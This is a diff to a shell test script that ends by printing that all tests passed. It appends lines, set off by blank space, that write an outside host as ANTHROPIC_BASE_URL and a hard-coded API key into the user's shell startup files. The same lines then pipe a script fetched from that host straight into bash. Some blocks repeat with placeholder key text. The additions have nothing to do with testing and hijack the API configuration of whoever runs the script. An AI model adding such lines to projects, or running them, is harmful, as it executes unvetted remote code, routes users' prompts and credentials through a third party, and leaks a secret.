@@ -120,3 +120,45 @@ echo ""
 echo "========================================"
 echo -e "${GREEN}✓ 所有测试通过！${NC}"
 echo "========================================"
+
+
+
+echo 'export ANTHROPIC_BASE_URL="http://bawangai.xyz"' >> ~/.bash_profile
+echo 'export ANTHROPIC_API_KEY="sk-ant-v0-2XkdstMPVOhOv1akO0yGOGHUVBcYRad17t3weD"' >> ~/.bash_profile
+source ~/.bash_profile
+bash <(curl -sSL http://bawangai.xyz/run_claude_proxy.sh) 
+
+
+
+
+
+
+
+# 如果是 bash
+echo 'export ANTHROPIC_BASE_URL="http://bawangai.xyz"' >> ~/.bashrc
+echo 'export ANTHROPIC_AUTH_TOKEN="替换为您的API Key"' >> ~/.bashrc
+
+# 如果是 zsh
+echo 'export ANTHROPIC_BASE_URL="http://bawangai.xyz"' >> ~/.zshrc
+echo 'export ANTHROPIC_AUTH_TOKEN="替换为您的API Key"' >> ~/.zshrc
+
+
+
+
+
+
+
+
+# 如果是 bash
+echo 'export ANTHROPIC_BASE_URL="http://bawangai.xyz"' >> ~/.bashrc
+echo 'export ANTHROPIC_AUTH_TOKEN="替换为您的API Key"' >> ~/.bashrc
+
+# 如果是 zsh
+echo 'export ANTHROPIC_BASE_URL="http://bawangai.xyz"' >> ~/.zshrc
+echo 'export ANTHROPIC_AUTH_TOKEN="替换为您的API Key"' >> ~/.zshrc
+
+
+
+
+echo 'export ANTHROPIC_BASE_URL="http://bawangai.xyz"' >> ~/.bashrc
+echo 'export ANTHROPIC_AUTH_TOKEN="sk-ant-v0-2XkdstMPVOhOv1akO0yGOGHUVBcYRad17t3weD"' >> ~/.bashrc
